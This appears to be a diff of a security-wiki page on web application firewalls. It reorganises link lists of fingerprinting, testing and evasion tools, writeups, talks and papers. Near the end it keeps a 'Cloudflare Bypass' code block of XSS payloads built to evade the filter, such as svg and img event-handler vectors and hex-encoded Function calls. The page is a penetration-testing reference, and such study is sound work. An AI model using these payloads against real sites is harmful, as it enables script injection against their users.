@@ -1,22 +1,14 @@
 # Web Application Firewall
 
-## WAF Testing Resources
-
 [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF) - The Definitive Guide.
 
-<details>
-
-<summary>Detection and Fingerprinting Tools</summary>
+### Fingerprinting
 
 * [WhatWaf](https://github.com/Ekultek/WhatWaf) - Detect and bypass web application firewalls and protection systems
 * [WAFW00F](https://github.com/enablesecurity/wafw00f) - The ultimate WAF fingerprinting tool with the largest fingerprint database from [@EnableSecurity](https://github.com/enablesecurity).
 * [IdentYwaf](https://github.com/stamparm/identywaf) - A blind WAF detection tool which utlises a unique method of identifying WAFs based upon previously collected fingerprints by [@stamparm](https://github.com/stamparm).
 
-</details>
-
-<details>
-
-<summary>WAF Testing Guides and Tools</summary>
+### Testing
 
 * [XSS-Rat's WAF Checklist](https://github.com/The-XSS-Rat/SecurityTesting/blob/master/Checklists/WAF-bypass-checklist.md) - Everything you need to do to bypass a Web Application Firewall.
 * [GoTestWAF](https://github.com/wallarm/gotestwaf) - A tool to test a WAF's detection logic and bypasses from [@wallarm](https://github.com/wallarm).
@@ -26,11 +18,7 @@
 * [Framework for Testing WAFs (FTW)](https://github.com/coreruleset/ftw) - A framework by the [OWASP CRS team](https://coreruleset.org/) that helps to provide rigorous tests for WAF rules by using the OWASP Core Ruleset V3 as a baseline.
 * [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - Bypassing WAF by abusing SSL/TLS Ciphers
 
-</details>
-
-<details>
-
-<summary>WAF Evasion and Bypass Tools</summary>
+### Evasion
 
 * [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
 * [WAFTester](https://github.com/Raz0r/waftester) - Another tool which can obfuscate payloads to bypass WAFs by [@Raz0r](https://github.com/Raz0r/).
@@ -43,13 +31,9 @@
   * [https://github.com/waf-bypass-maker/waf-community-bypasses](https://github.com/waf-bypass-maker/waf-community-bypasses)
   * [https://github.com/Walidhossain010/WAF-bypass-xss-payloads](https://github.com/Walidhossain010/WAF-bypass-xss-payloads)
 
-</details>
+### Blogs and Writeups
 
-## Training and Research
-
-{% tabs %}
-{% tab title="Blogs and Writeups" %}
-> Many of the content mentioned above have been taken from some of the following excellent writeup
+> Many of the content mentioned above have been taken from some of the following excellent writeups.
 
 * [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
 * [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com).
@@ -61,23 +45,9 @@
 * [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://twitter.com/sunnyhoi).
 * [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) - By [@0x09AL](https://twitter.com/0x09al).
 * [Request Encoding to Bypass WAFs](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/) - By [@Soroush Dalili](https://twitter.com/irsdl)
-{% endtab %}
 
-{% tab title="Presentations" %}
-* [Methods to Bypass a Web Application Firewall](https://github.com/0xInfection/Awesome-WAF/blob/master/presentrations/Methods%20To%20Bypass%20A%20Web%20Application%20Firewall.pdf) - A presentation from [PT Security](https://www.ptsecurity.com) about bypassing WAF filters and evasion.
-* [Web Application Firewall Bypassing (How to Defeat the Blue Team)](https://github.com/0xInfection/Awesome-WAF/blob/master/presentation/Web%20Application%20Firewall%20Bypassing%20\(How%20to%20Defeat%20the%20Blue%20Team\).pdf) - A presentation about bypassing WAF filtering and ruleset fuzzing for evasion by [@OWASP](https://owasp.org).
-* [WAF Profiling & Evasion Techniques](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
-* [Protocol Level WAF Evasion Techniques](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20\(Slides\).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
-* [Analysing Attacking Detection Logic Mechanisms](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
-* [WAF Bypasses and PHP Exploits](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20\(Slides\).pdf) - A presentation about evading WAFs and developing related PHP exploits.
-* [Side Channel Attacks for Fingerprinting WAF Filter Rules](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Side%20Channel%20Attacks%20for%20Fingerprinting%20WAF%20Filter%20Rules.pdf) - A presentation about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
-* [Our Favorite XSS Filters/IDS and how to Attack Them](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/).
-* [Playing Around with WAFs](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
-* [A Forgotten HTTP Invisibility Cloak](https://github.com/0xInfection/Awesome-WAF/blob/master/presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).
-* [Building Your Own WAF as a Service and Forgetting about False Positives](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Building%20Your%20Own%20WAF%20as%20a%20Service%20and%20Forgetting%20about%20False%20Positives.pdf) - A presentation about how to build a hybrid mode waf that can work both in an out-of-band manner as well as inline to reduce false positives and latency [Auscert2019](https://conference.auscert.org.au/).
-{% endtab %}
+### Video Presentations
 
-{% tab title="Videos" %}
 * [WAF Bypass Techniques Using HTTP Standard and Web Servers Behavior](https://www.youtube.com/watch?v=tSf\_IXfuzXk) from [@OWASP](https://owasp.org).
 * [Confessions of a WAF Developer: Protocol-Level Evasion of Web App Firewalls](https://www.youtube.com/watch?v=PVVG4rCFZGU) from [BlackHat USA 12](https://blackhat.com/html/bh-us-12).
 * [Web Application Firewall - Analysis of Detection Logic](https://www.youtube.com/watch?v=dMFJLicdaC0) from [BlackHat](https://blackhat.com).
@@ -94,9 +64,9 @@
 * [Adventures with the WAF](https://www.youtube.com/watch?v=rdwB\_p0KZXM) from [BSides Manchester](https://www.youtube.com/channel/UC1mLiimOTqZFK98VwM8Ke4w).
 * [Bypassing Intrusion Detection Systems](https://www.youtube.com/watch?v=cJ3LhQXzrXw) from [BlackHat](https://blackhat.com).
 * [Building Your Own WAF as a Service and Forgetting about False Positives](https://www.youtube.com/watch?v=dgqUcHprolc) from [Auscert](https://conference.auscert.org.au).
-{% endtab %}
 
-{% tab title="Research Papers" %}
+### Presentations & Research Papers
+
 #### Research Papers:
 
 * [Protocol Level WAF Evasion](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
@@ -111,14 +81,24 @@
 * [Bypassing all WAF XSS Filters](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
 * [Beyond SQLi - Obfuscate and Bypass WAFs](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.
 * [Bypassing WAF XSS Detection Mechanisms](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf) - A research paper about bypassing XSS detection mechanisms in WAFs.
-{% endtab %}
-{% endtabs %}
 
-## Cloudflare Bypass
+#### Presentations:
 
-<details>
+* [Methods to Bypass a Web Application Firewall](https://github.com/0xInfection/Awesome-WAF/blob/master/presentrations/Methods%20To%20Bypass%20A%20Web%20Application%20Firewall.pdf) - A presentation from [PT Security](https://www.ptsecurity.com) about bypassing WAF filters and evasion.
+* [Web Application Firewall Bypassing (How to Defeat the Blue Team)](https://github.com/0xInfection/Awesome-WAF/blob/master/presentation/Web%20Application%20Firewall%20Bypassing%20\(How%20to%20Defeat%20the%20Blue%20Team\).pdf) - A presentation about bypassing WAF filtering and ruleset fuzzing for evasion by [@OWASP](https://owasp.org).
+* [WAF Profiling & Evasion Techniques](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
+* [Protocol Level WAF Evasion Techniques](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20\(Slides\).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
+* [Analysing Attacking Detection Logic Mechanisms](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
+* [WAF Bypasses and PHP Exploits](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20\(Slides\).pdf) - A presentation about evading WAFs and developing related PHP exploits.
+* [Side Channel Attacks for Fingerprinting WAF Filter Rules](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Side%20Channel%20Attacks%20for%20Fingerprinting%20WAF%20Filter%20Rules.pdf) - A presentation about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
+* [Our Favorite XSS Filters/IDS and how to Attack Them](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/).
+* [Playing Around with WAFs](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
+* [A Forgotten HTTP Invisibility Cloak](https://github.com/0xInfection/Awesome-WAF/blob/master/presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).
+* [Building Your Own WAF as a Service and Forgetting about False Positives](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Building%20Your%20Own%20WAF%20as%20a%20Service%20and%20Forgetting%20about%20False%20Positives.pdf) - A presentation about how to build a hybrid mode waf that can work both in an out-of-band manner as well as inline to reduce false positives and latency [Auscert2019](https://conference.auscert.org.au/).
 
-<summary>Cloudflare Bypass</summary>
+## Attack Code
+
+### Cloudflare Bypass
 
 ```
 <svg%0Aonauxclick=0;[1].some(confirm)//
@@ -162,7 +142,3 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 
 <img ignored=() src=x onerror=prompt(1)>
 ```
-
-
-
-</details>
